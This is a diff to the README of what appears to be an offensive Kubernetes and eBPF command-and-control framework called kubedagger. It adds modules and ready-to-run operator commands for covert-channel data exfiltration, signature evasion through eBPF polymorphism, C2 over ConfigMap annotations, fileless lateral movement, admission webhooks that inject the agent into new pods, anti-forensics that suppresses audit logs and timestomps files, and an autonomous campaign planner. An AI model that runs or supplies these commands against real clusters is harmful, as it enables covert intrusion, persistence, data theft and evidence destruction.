@@ -1817,6 +1817,13 @@ Agents include a built-in module system for executing specialized techniques wit
 | `sa_token` | linux, windows, darwin | Read and decode Kubernetes service account tokens |
 | `dns_exfil` | linux, windows, darwin | Exfiltrate data via DNS TXT queries |
 | `honeypot_detect` | linux, windows, darwin | Detect honeypots and deception infrastructure |
+| `covert_channel` | linux | Kernel-level covert channels (ICMP, DNS, TCP retransmit, TTL steganography) |
+| `polymorph` | linux | eBPF bytecode polymorphism for signature evasion |
+| `k8s_c2` | linux, windows, darwin | C2 communication via Kubernetes API (ConfigMap annotations) |
+| `memexec` | linux | Memory-only execution and lateral movement (memfd, procmem, ptrace) |
+| `webhook_deploy` | linux, windows, darwin | Deploy weaponized admission webhooks for Pod injection |
+| `antiforensics` | linux | Anti-forensics eBPF hooks (audit suppression, log filtering, timestomping) |
+| `autonomy` | linux, windows, darwin | Autonomous objective engine with rule-based forward-chaining planner |
 
 **Module usage via operator:**
 
@@ -1835,6 +1842,27 @@ Agents include a built-in module system for executing specialized techniques wit
 
 # Honeypot detection
 ./bin/kubedagger-operator -key $KEY module <agent-id> honeypot_detect
+
+# Covert channel communication (ICMP, DNS, TCP retransmit, or TTL)
+./bin/kubedagger-operator -key $KEY module <agent-id> covert_channel channel=icmp target=10.0.2.1 data=exfildata
+
+# eBPF polymorphism (mutate loaded programs to evade signatures)
+./bin/kubedagger-operator -key $KEY module <agent-id> polymorph program=network_probe
+
+# K8s API C2 channel (use ConfigMap annotations for tasking)
+./bin/kubedagger-operator -key $KEY module <agent-id> k8s_c2 namespace=default configmap=system-config
+
+# Memory-only execution (fileless lateral movement)
+./bin/kubedagger-operator -key $KEY module <agent-id> memexec method=memfd payload=/tmp/agent
+
+# Deploy admission webhook (inject agent into new Pods)
+./bin/kubedagger-operator -key $KEY module <agent-id> webhook_deploy namespace=default image=agent:latest
+
+# Anti-forensics (suppress audit, filter logs, manipulate timestamps)
+./bin/kubedagger-operator -key $KEY module <agent-id> antiforensics action=suppress_audit pid=1234
+
+# Autonomous objective execution (goal-directed multi-step campaigns)
+./bin/kubedagger-operator -key $KEY module <agent-id> autonomy objective=persist target=cluster
 ```
 
 ---
